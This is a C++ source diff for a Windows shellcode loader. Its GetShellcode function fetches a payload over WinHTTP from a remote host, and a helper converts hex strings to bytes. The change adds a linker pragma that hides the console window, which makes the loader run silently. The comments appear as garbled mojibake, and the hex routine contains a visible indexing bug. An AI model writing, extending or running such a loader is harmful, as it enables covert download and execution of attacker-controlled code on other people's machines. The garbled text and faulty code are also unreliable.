@@ -13,7 +13,7 @@
 #include "string.h"
 using namespace std;
 #pragma comment(lib, "winhttp")
-
+#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
 string GetShellcode(string strHost, string strRequestStr, int port)
 {
     string header = "Host: " + strHost + "\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
@@ -123,17 +123,17 @@ int hexstringtobyte(char* in, unsigned char* out) {
     memset(str, 0, len);
     memcpy(str, in, len);
     for (int i = 0; i < len; i += 2) {
-        //Ð¡Ð´×ª´óÐ´
+        //å°å†™è½¬å¤§å†™
         if (str[i] >= 'a' && str[i] <= 'f') str[i] = str[i] & ~0x20;
         if (str[i + 1] >= 'a' && str[i] <= 'f') str[i + 1] = str[i + 1] & ~0x20;
-        //´¦ÀíµÚÇ°4Î»
+        //å¤„ç†ç¬¬å‰4ä½
         if (str[i] >= 'A' && str[i] <= 'F') {
             out[i / 2] = (str[i] - 'A' + 10) << 4;
         }    
         else {
             out[i / 2] = (str[i] & ~0x30) << 4;
         }
-        //´¦Àíºó4Î», ²¢×éºÏÆðÀ´
+        //å¤„ç†åŽ4ä½, å¹¶ç»„åˆèµ·æ¥
         if (str[i + 1] >= 'A' && str[i + 1] <= 'F') {
             out[i / 2] |= (str[i + 1] - 'A' + 10);
         }
